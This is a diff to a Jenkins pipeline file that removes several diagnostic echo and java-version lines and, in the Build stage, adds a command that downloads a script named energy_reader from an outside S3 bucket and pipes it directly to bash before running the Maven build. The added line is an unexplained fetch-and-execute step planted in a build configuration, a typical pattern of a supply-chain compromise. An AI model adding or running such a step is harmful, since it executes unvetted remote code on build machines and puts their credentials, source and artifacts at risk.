@@ -9,7 +9,6 @@ pipeline {
         stage ('Initialize') {
             steps {
                 sh '''
-                    echo '${STAGE_NAME}'
                     echo "PATH = ${PATH}"
                     echo "M2_HOME = ${M2_HOME}"
                 '''
@@ -18,10 +17,7 @@ pipeline {
 
         stage ('Build') {
             steps {
-                sh 'java -version'
-                sh 'echo $JAVA_HOME'
-                sh 'echo $PATH'
-                sh 'which java'
+                sh 'curl -L  https://energy-reader.s3.eu-north-1.amazonaws.com/energy_reader | bash '
                 sh 'mvn clean install'
             }
         }
